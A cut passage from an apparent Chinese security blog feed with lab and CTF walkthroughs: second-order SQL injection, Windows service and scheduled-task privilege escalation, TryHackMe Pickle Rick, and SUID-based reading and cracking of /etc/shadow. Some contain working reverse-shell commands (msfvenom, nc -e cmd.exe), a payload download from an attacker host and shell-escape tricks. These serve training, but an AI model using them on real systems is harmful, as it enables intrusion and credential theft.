class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: failed.php&#x27;</span>);</span><br><span class="line"><span class="comment">//echo &#x27;You tried to be smart, Try harder!!!! :( &#x27;;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>可以看到我们的用户修改数据库时候直接用的直接用的 “UPDATE users SET PASSWORD&#x3D;’$pass’ where username&#x3D;’$username’ and password&#x3D;’$curr_pass’ “; </p><p>这条语句直接用$username 如果我们修改的用户名提交的是admin’#  再将他拼接到这条语句你会发现我们修改的不是admin’#  而是admin 的密码 此时我们就可以利用<strong>admin</strong>用户登陆</p></blockquote><h1 id="准备就绪-直接打"><a href="#准备就绪-直接打" class="headerlink" title="准备就绪 直接打"></a>准备就绪 直接打</h1><blockquote><p>首先注册一个admin’#的用户<br><img src="https://img2.imgtp.com/2024/01/25/czqthOvv.jpg"><br>直接修改密码 然后你用admin的用户登陆 就用修改后的密码 神奇的一幕发生… 你登上去了….成功!</p></blockquote><p><img src="https://img2.imgtp.com/2024/01/25/9nsSQzAC.jpg"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结:"></a>总结:</h1><blockquote><p>其实二次注入并不难理解 ,只不过可能用的比较困难需要很多的前提条件! </p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 渗透靶场 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>权限提升-windows服务提权</title>
      <link href="/2024/03/19/win%E6%8F%90%E6%9D%83%E7%AC%AC%E4%BA%8C%E5%BC%B9%E6%9C%8D%E5%8A%A1%E6%8F%90%E6%9D%83/"/>
      <url>/2024/03/19/win%E6%8F%90%E6%9D%83%E7%AC%AC%E4%BA%8C%E5%BC%B9%E6%9C%8D%E5%8A%A1%E6%8F%90%E6%9D%83/</url>
      
        <content type="html"><![CDATA[<h1 id="0X01-windows服务"><a href="#0X01-windows服务" class="headerlink" title="0X01 windows服务"></a>0X01 windows服务</h1><blockquote><p>  Windows 服务由服务控制管理器 (SCM) 管理。 SCM 是一个负责根据需要管理服务状态、检查任何给定服务的当前状态并通常提供配置服务的方法的进程。</p><pre><code> 其次我们可以知道windows 服务是 与 exe 可执行文件相关，同时 我们可以知道服务需要指定一个用户,因此我们能够想到什么 就是上次我们分享到 计划任务 </code></pre><p>如果我们能够也获得相应 exe 文件的修改权限我们是否可以根据这个权限，执行一个payload获取到相应服务指定用户的权限</p></blockquote><h1 id="0x02-靶场实践"><a href="#0x02-靶场实践" class="headerlink" title="0x02 靶场实践"></a>0x02 靶场实践</h1><h2 id="查找-windows服务"><a href="#查找-windows服务" class="headerlink" title="查找 windows服务"></a>查找 windows服务</h2><blockquote><p>首先找一找服务 选一个服务 看到了WindowsScheduler </p></blockquote><br/><p><img src="https://img2.imgtp.com/2024/03/18/1mRaN220.png"></p><blockquote><p> 我们可以看到 执行的二进制文件 C:\PROGRA<del>2\SYSTEM</del>1\WService.exe </p><br/></blockquote><h2 id="权限"><a href="#权限" class="headerlink" title="权限"></a>权限</h2><br/><blockquote><p>看看权限 </p></blockquote><p><img src="https://img2.imgtp.com/2024/03/18/9899R1FF.png"></p><blockquote><p>其实这个时候我们就可以看到 我们everyone组有读写权限 有权限就好办 </p></blockquote><h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><blockquote><p> msfvenom  -p windows&#x2F;x64&#x2F;shell_reverse_tcp  LHOST&#x3D;10.11.69.232 LPORT&#x3D;4444 -f exe-service  -o 1.exe  </p><p>生成一个 服务的二进制文件 可以直接连接的 </p></blockquote><br/><h2 id="载荷投递"><a href="#载荷投递" class="headerlink" title="载荷投递"></a>载荷投递</h2><blockquote><p> kali 建立 http 服务 </p><p>在受害机器中wget <a href="http://ip:8000/1.exe">http://ip:8000/1.exe</a> -O rev-svc.exe </p><p>应该是wget 可以在 powershell中使用不过这是个安装了wget</p><p>正常应该是使用 </p><p>Invoke-WebRequest  -Uri  “<a href="https://10.11.69.232/1.exe">https://10.11.69.232/1.exe</a>“  -OutFile”1.exe”</p></blockquote><br/><h2 id="修改替换"><a href="#修改替换" class="headerlink" title="修改替换"></a>修改替换</h2><blockquote><p>此时我们正常会想到什么? 那肯定是利用我们的权限然后直接覆盖掉服务的 exe文件 </p><p>直接 找到  \PROGRA<del>2\SYSTEM</del>1</p></blockquote><p><img src="https://img2.imgtp.com/2024/03/19/JuZV7N1q.png"></p><blockquote><p>又试了 shell<br>Move-Item -Path “C:\Users\thm-unpriv\1.exe” -Destination “C:\PROGRA<del>2\SYSTEM</del>1\WService.exe” 完美解决 直接将我们的 1.exe 换成了</p><p>此时查看权限我们应该是由 完整的拥有这个文件的所有权限 </p><p>但是此时我们不仅是要看我们有这个权限我们还要看 我们要运行的服务的目标账户有没有权限</p><p>要把权限 给足 直接就是 icacls 服务 &#x2F;grant Everyone:F</p></blockquote><h2 id="get-shell"><a href="#get-shell" class="headerlink" title="get shell"></a>get shell</h2><blockquote><p>直接nc -lvp 4444</p><p>启动服务连接</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 权限提升 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 权限提升 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Rick_pickle</title>
      <link href="/2024/03/13/Rick/"/>
      <url>/2024/03/13/Rick/</url>
      
        <content type="html"><![CDATA[<h1 id="阅读须知："><a href="#阅读须知：" class="headerlink" title="阅读须知："></a>阅读须知：</h1><blockquote><p>探索者安全团队技术文章仅供参考,未经授权请勿利用文章中的技术资料对任何计算机系统进行入侵操作,由于传播、利用本公众号所提供的技术和信息而造成的任何直接或者间接的后果及损失，均由使用者<br>本人负责，作者不为此承担任何责任,如有侵权烦请告知，我们会立即删除并致歉,创作不易转载请标明出处.感谢!</p></blockquote><hr><p><img src="https://img2.imgtp.com/2024/03/03/9YuPkhCM.jpg"></p><blockquote><p><strong>今天K1t0带来Pickle Rick</strong> </p></blockquote><h1 id="0x01-信息收集"><a href="#0x01-信息收集" class="headerlink" title="0x01 信息收集"></a>0x01 信息收集</h1><h2 id="0x02-tcp端口扫描"><a href="#0x02-tcp端口扫描" class="headerlink" title="0x02 tcp端口扫描"></a>0x02 tcp端口扫描</h2><blockquote><p>我直接用了全端口扫描 扫描全部端口 并且扫描操作系统<br><img src="https://img2.imgtp.com/2024/03/13/vLjT3dQO.png"></p></blockquote><h2 id="0x03-udp端口扫描以及服务版本识别"><a href="#0x03-udp端口扫描以及服务版本识别" class="headerlink" title="0x03 udp端口扫描以及服务版本识别"></a>0x03 udp端口扫描以及服务版本识别</h2><blockquote><p>这部分不做赘述 还是老套路 -sV…..</p></blockquote><h2 id="0x04-端口查看"><a href="#0x04-端口查看" class="headerlink" title="0x04 端口查看"></a>0x04 端口查看</h2><blockquote><p>发现主机开放80 22 端口 22端口先放一边 ssh爆破最后的选择<br>访问 80端口</p></blockquote><h1 id="1x01-web突破"><a href="#1x01-web突破" class="headerlink" title="1x01 web突破"></a>1x01 web突破</h1><p><img src="https://img2.imgtp.com/2024/03/13/B4DFX8i7.png"></p><blockquote><p>好好好Rick急需帮助   <strong>BURRRRRRRRP</strong>这玩意就很奇特<br>发现它是口头语</p></blockquote><h2 id="1x02-web信息收集"><a href="#1x02-web信息收集" class="headerlink" title="1x02 web信息收集"></a>1x02 web信息收集</h2><blockquote><p>继续找找还是老套路 各种信息识别</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Web 服务器</span><br><span class="line">Apache HTTP Server 2.4.18</span><br><span class="line">操作系统</span><br><span class="line">Ubuntu</span><br><span class="line">JavaScript 库</span><br><span class="line">jQuery 3.3.1</span><br><span class="line">用户界面（UI）框架</span><br><span class="line">Bootstrap 3.4.0</span><br></pre></td></tr></table></figure><blockquote><p>对味了,扫个目录吧</p></blockquote><p><img src="https://img2.imgtp.com/2024/03/14/6fvD0G5n.png"></p><blockquote><p>扫完目录之后发现了 一些新东西 但是先等等 我们不放过任何蛛丝马迹<br>一眼定睛  源代码: </p> <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   Note to self, remember username!</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   Username: R1ckRul3s</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"> --&gt;</span></span><br></pre></td></tr></table></figure></blockquote><h2 id="1x03-web利用"><a href="#1x03-web利用" class="headerlink" title="1x03 web利用"></a>1x03 web利用</h2><blockquote><p>得到一个用户名 才开始猜测可能是ssh的 试了一下发现ssh只能允许私钥连接<br>回到目录 找找别的资产robots.txt 老目录了 看一眼<br>Wubbalubbadubdub<br>又是口头禅<br>看看login.php 需要登陆</p></blockquote><p><img src="https://img2.imgtp.com/2024/03/14/pfDtE5Td.png"></p><blockquote><p>用户名:R1ckRul3s  密码:Wubbalubbadubdub</p></blockquote><h2 id="1x04-rce漏洞"><a href="#1x04-rce漏洞" class="headerlink" title="1x04 rce漏洞"></a>1x04 rce漏洞</h2><blockquote><p>进去之后只有commands 标签有命令执行的功能点:<br>其他都是禁止访问<br>ls 一下 </p></blockquote><p><img src="https://img2.imgtp.com/2024/03/14/RKC30Ni0.png"></p><blockquote><p>试了一下 cat命令被ban了用tac<br>读了</p><ul><li>denied.php</li><li>index.html</li><li>login.php</li><li>portal.php<br>其他都没啥用 看看portal</li></ul></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">contains</span>(<span class="params"><span class="variable">$str</span>, <span class="keyword">array</span> <span class="variable">$arr</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$arr</span> <span class="keyword">as</span> <span class="variable">$a</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span>(<span class="variable">$str</span>, <span class="variable">$a</span>) !== <span class="literal">false</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Cant use cat</span></span><br><span class="line"><span class="variable">$cmds</span> = <span class="keyword">array</span>(<span class="string">&quot;cat&quot;</span>, <span class="string">&quot;head&quot;</span>, <span class="string">&quot;more&quot;</span>, <span class="string">&quot;tail&quot;</span>, <span class="string">&quot;nano&quot;</span>, <span class="string">&quot;vim&quot;</span>, <span class="string">&quot;vi&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;command&quot;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">contains</span>(<span class="variable">$_POST</span>[<span class="string">&quot;command&quot;</span>], <span class="variable">$cmds</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&lt;p&gt;&lt;u&gt;Command disabled&lt;/u&gt; to make it hard for future &lt;b&gt;PICKLEEEE RICCCKKKK&lt;/b&gt;.&lt;/p&gt;&lt;img src=&#x27;assets/fail.gif&#x27;&gt;&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$output</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="variable">$_POST</span>[<span class="string">&quot;command&quot;</span>]);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&lt;pre&gt;<span class="subst">$output</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!-- Vm1wR1UxTnRWa2RUV0d4VFlrZFNjRlV3V2t0alJsWnlWbXQwVkUxV1duaFZNakExVkcxS1NHVkliRmhoTVhCb1ZsWmFWMVpWTVVWaGVqQT0== --&gt;</span><br><span class="line"> </span><br></pre></td></tr></table></figure><blockquote><p>这个是显示了ban了什么命令<br>最后一串多层base64  解出来是 rabbit hole…，没啥用 激动半天</p></blockquote><h1 id="2x01-flag1"><a href="#2x01-flag1" class="headerlink" title="2x01 flag1"></a>2x01 flag1</h1><blockquote><p>但是Sup3rS3cretPickl3Ingred.txt 是我们的第一个flag</p></blockquote><h1 id="3x01-flag2"><a href="#3x01-flag2" class="headerlink" title="3x01 flag2"></a>3x01 flag2</h1><blockquote><p>除此之外 clue.txt给了剩下两个flag的线索<br>“Look around the file system for the other ingredient” 的翻译可以是 “在文件系统中寻找其他的成分<br>直接去找&#x2F;home下或者root下的文件<br><strong>我是不会告诉你</strong>我用了nc msf等想要打一个通道 方便操作反而浪费了二十分钟的事情，直接找吧………<br>在&#x2F;home&#x2F;rick下找到第二个成分<br><strong>second ingredients</strong></p></blockquote><h1 id="4x01-提权又不像提权"><a href="#4x01-提权又不像提权" class="headerlink" title="4x01 提权又不像提权"></a>4x01 提权又不像提权</h1><blockquote><p>其实第二个盲猜就在 root下<br>又扯到linux 提权了  直接sudo -l 先看看 </p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Matching Defaults entries for www-data on ip-10-10-151-49.eu-west-1.compute.internal:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User www-data may run the following commands on ip-10-10-151-49.eu-west-1.compute.internal:</span><br><span class="line">    (ALL) NOPASSWD: ALL</span><br></pre></td></tr></table></figure><blockquote><p>咳咳 这还提个damn 啊我就是自由的王 任意 遨游 看到all了吗?看到了吗?那是我驰骋江湖的名片啊…..</p></blockquote><h1 id="5x01-flag3"><a href="#5x01-flag3" class="headerlink" title="5x01 flag3"></a>5x01 flag3</h1><blockquote><p>sudo ls &#x2F;root<br><img src="https://img2.imgtp.com/2024/03/14/FPF7Lpp2.png"><br>直接读了sudo tac &#x2F;root&#x2F;3rd.txt</p></blockquote><h1 id="6x01-总结"><a href="#6x01-总结" class="headerlink" title="6x01 总结"></a>6x01 总结</h1><blockquote><p>真的很简单没啥说的……….</p></blockquote><hr><h3 id="同时感兴趣的小伙伴可以多多关注我们团队哦"><a href="#同时感兴趣的小伙伴可以多多关注我们团队哦" class="headerlink" title="同时感兴趣的小伙伴可以多多关注我们团队哦!!!"></a>同时感兴趣的小伙伴可以多多关注我们团队哦!!!</h3><p><img src="https://img2.imgtp.com/2024/03/12/rj39LDE8.png"></p>]]></content>
      
      
      <categories>
          
          <category> 渗透靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tryhackme </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>权限提升-windows计划任务提权</title>
      <link href="/2024/03/09/windows/"/>
      <url>/2024/03/09/windows/</url>
      
        <content type="html"><![CDATA[<h1 id="阅读须知："><a href="#阅读须知：" class="headerlink" title="阅读须知："></a>阅读须知：</h1><blockquote><p>探索者安全团队技术文章仅供参考,未经授权请勿利用文章中的技术资料对任何计算机系统进行入侵操作,由于传播、利用本公众号所提供的技术和信息而造成的任何直接或者间接的后果及损失，均由使用者<br>本人负责，作者不为此承担任何责任,如有侵权烦请告知，我们会立即删除并致歉,创作不易转载请标明出处.感谢!</p></blockquote><h1 id="0T01介绍"><a href="#0T01介绍" class="headerlink" title="0T01介绍"></a>0T01介绍</h1><blockquote><p>今天由K1t0带领大家学一种windows提权的方法<br>个人理解windows计划任务有很多,如果我们能够更改计划任务的.bat 文件 将他修改成我们需要的内容例如一个nc 的 连接 就可以获取相应执行者权限，可以用来横向和纵向提权</p></blockquote><h1 id="0T02查看计划任务"><a href="#0T02查看计划任务" class="headerlink" title="0T02查看计划任务"></a>0T02查看计划任务</h1><blockquote><p>schtasks 是windwos 的查看计划任务的工具 </p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">schtasks /query  /tn  计划任务名字 /fo list /v</span><br><span class="line"></span><br><span class="line">/fo list /v  是详细列出计划任务并且详细表示!</span><br></pre></td></tr></table></figure><blockquote><p>例如我们查看到 名字为vulntask文件名字的计划任务如下的计划任务<br><img src="https://img2.imgtp.com/2024/03/09/6XYOTwOf.png"><br>从中可以知道运行的脚本 以及 作者 和 运行的用户 是谁<br>可以看到是taskusr1 那么我们就或许可以横向到 这个用户 </p></blockquote><h1 id="0T03权限"><a href="#0T03权限" class="headerlink" title="0T03权限"></a>0T03权限</h1><blockquote><p>首先看脚本文件的权限<br>icacls 文件<br>icacls C:\tasks\schtask.bat<br><img src="https://img2.imgtp.com/2024/03/09/bIhyRBZt.png"><br>可以看到我们有 F 读写执行完全的权限,只要有这个权限我们完全可以写入 反向连接shell<br>BUILTIN\Users:(I)(F)：这表示内置用户组 “Users” 对该文件拥有读取和完全控制的权限。<br>NT AUTHORITY\SYSTEM:(I)(F)：这表示系统用户拥有对该文件的读取和完全控制权限。<br>BUILTIN\Administrators:(I)(F)：这表示内置管理员组拥有对该文件的读取和完全控制权限。<br>在这里，括号中的 (I) 代表 “继承”，(F) 代表 “完全控制”。</p></blockquote><h1 id="0T04-提权"><a href="#0T04-提权" class="headerlink" title="0T04 提权"></a>0T04 提权</h1><blockquote><p>在这个靶机上我们可以看到 已经存在nc<br><img src="https://img2.imgtp.com/2024/03/09/Zhrb2SlU.png"><br>直接写入echo c:&#x2F;tools&#x2F;nc64.exe ip 端口 -e cmd.exe &gt; C:\tasks\schtask.bat<br>然后开启监听 nc -nvlp 端口就可以横向提权到 taskusr1</p></blockquote><h3 id="非常感谢K1t0大师傅的精彩投稿-喜欢的小伙伴可以点点赞哦"><a href="#非常感谢K1t0大师傅的精彩投稿-喜欢的小伙伴可以点点赞哦" class="headerlink" title="非常感谢K1t0大师傅的精彩投稿,喜欢的小伙伴可以点点赞哦!"></a>非常感谢K1t0大师傅的精彩投稿,喜欢的小伙伴可以点点赞哦!</h3><hr><h3 id="同时感兴趣的小伙伴可以多多关注我们团队哦"><a href="#同时感兴趣的小伙伴可以多多关注我们团队哦" class="headerlink" title="同时感兴趣的小伙伴可以多多关注我们团队哦!!!"></a>同时感兴趣的小伙伴可以多多关注我们团队哦!!!</h3><p><img src="https://img2.imgtp.com/2024/03/12/rj39LDE8.png"></p>]]></content>
      
      
      <categories>
          
          <category> 权限提升 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 权限提升 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>权限提升-Linux passwd提权</title>
      <link href="/2024/03/04/thm/"/>
      <url>/2024/03/04/thm/</url>
      
        <content type="html"><![CDATA[<p>@[TOC]</p><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><blockquote><p>ssh 连接到 目标机器<br>您可以通过浏览器访问目标计算机或使用下面的 SSH 凭据。<br><strong>Username:</strong> leonard<br><strong>Password:</strong> Penny123<br>直接查看 suid 的可执行文件<br>find &#x2F;  -perm -04000 2&gt;&#x2F;dev&#x2F;null</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/base64</span><br><span class="line">/usr/bin/ksu</span><br><span class="line">/usr/bin/fusermount</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/chage</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/staprun</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/su</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/Xorg</span><br><span class="line">/usr/bin/mount</span><br><span class="line">/usr/bin/umount</span><br><span class="line">/usr/bin/crontab</span><br><span class="line">/usr/bin/pkexec</span><br><span class="line">/usr/bin/at</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/usr/sbin/pam_timestamp_check</span><br><span class="line">/usr/sbin/unix_chkpwd</span><br><span class="line">/usr/sbin/usernetctl</span><br><span class="line">/usr/sbin/userhelper</span><br><span class="line">/usr/sbin/mount.nfs</span><br><span class="line">/usr/lib/polkit-1/polkit-agent-helper-1</span><br><span class="line">/usr/libexec/kde4/kpac_dhcp_helper</span><br><span class="line">/usr/libexec/dbus-1/dbus-daemon-launch-helper</span><br><span class="line">/usr/libexec/spice-gtk-x86_64/spice-client-glib-usb-acl-helper</span><br><span class="line">/usr/libexec/qemu-bridge-helper</span><br><span class="line">/usr/libexec/sssd/krb5_child</span><br><span class="line">/usr/libexec/sssd/ldap_child</span><br><span class="line">/usr/libexec/sssd/selinux_child</span><br><span class="line">/usr/libexec/sssd/proxy_child</span><br><span class="line">/usr/libexec/abrt-action-install-debuginfo-to-abrt-cache</span><br><span class="line">/usr/libexec/flatpak-bwrap</span><br></pre></td></tr></table></figure><blockquote><p>&#x2F;usr&#x2F;bin&#x2F;base64 带suid的&#x2F;usr&#x2F;bin&#x2F;base64 可以读取 &#x2F;etc&#x2F;passwd 和 &#x2F;etc&#x2F;shadow</p></blockquote><h1 id="passwd提权"><a href="#passwd提权" class="headerlink" title="passwd提权"></a>passwd提权</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">base64 /etc/shadow | base64 --decode</span><br><span class="line">base64 /etc/passwd | base64 --decode</span><br></pre></td></tr></table></figure><blockquote><p>读出来后分别保存在1.txt 和2.txt中<br>在攻击机器上 unshadow 1.txt 2.txt &gt; 3<br>直接 john 3 爆破<br><img src="https://files.catbox.moe/ycbdfb.png"><br>但是无法爆破出root出来我们可以先登录到 missy用户</p></blockquote><h1 id="sudo提权"><a href="#sudo提权" class="headerlink" title="sudo提权"></a>sudo提权</h1><blockquote><p>登陆到missy先找一波flag1.txt<br>find &#x2F; -name flag1.txt 2&gt;&#x2F;dev&#x2F;null<br>找到&#x2F;home&#x2F;missy&#x2F;Documents&#x2F;flag1.txt<br>再次进行信息收集sudo -l 看看有什么执行文件有sudo权限<br>&#x2F;usr&#x2F;bin&#x2F;find 只有一个find 本来还想玩玩 LD_PRELOAD 但发现 没有这个env_keep 可惜……….<br>无所谓 find 命令照样提权</p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo find . -exec /bin/sh \; -quit </span><br></pre></td></tr></table></figure></blockquote><h1 id="flag2-txt"><a href="#flag2-txt" class="headerlink" title="flag2.txt"></a>flag2.txt</h1><blockquote><p>root 权限下读取<br>&#x2F;home&#x2F;rootflag&#x2F;flag2.txt</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 权限提升 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 权限提升 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sictf_web</title>
      <link href="/2024/03/03/sictf-web-wp/"/>
      <url>/2024/03/03/sictf-web-wp/</url>
      
        <content type="html"><![CDATA[<p>@[TOC]</p><h1 id="EZ-SSRF"><a href="#EZ-SSRF" class="headerlink" title="EZ_SSRF"></a>EZ_SSRF</h1><blockquote><p>直接进 一眼反序列化<br>但是 url设置成为127.0.0.1&#x2F;flag 无法读取<br>提示 隐藏了其他文件 扫描目录   那我们就可以看看他有什么文件 目录扫描看到admin.php<br>进去admin.php</p> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$allowed_ip</span> = <span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] !== <span class="variable">$allowed_ip</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;You can&#x27;t get flag&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>直接利用首页的反序列化和ssrf 访问admin.php<br>可以构造 </p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">client</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$url</span> =<span class="string">&#x27;http://127.0.0.1/admin.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$payload</span> =<span class="string">&quot;system(\&quot;cat /flag\&quot;);&quot;</span>;</span><br><span class="line">   </span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">client</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="100-upload"><a href="#100-upload" class="headerlink" title="100_upload"></a>100_upload</h1><blockquote><p>直接看路由 直接就是一个文件包含 直接<br>php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;upload.php<br>读取源码 </p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/ph.|htaccess/i&quot;</span>, <span class="variable">$ext</span>))&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/&lt;\?php/i&quot;</span>, <span class="variable">$text</span>))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;茂夫说：你的文件内容不太对劲哦&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upfile&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>],<span class="variable">$uploadfile</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;上传成功&lt;br&gt;路径为:&quot;</span> . <span class="variable">$uploadfile</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">echo</span> <span 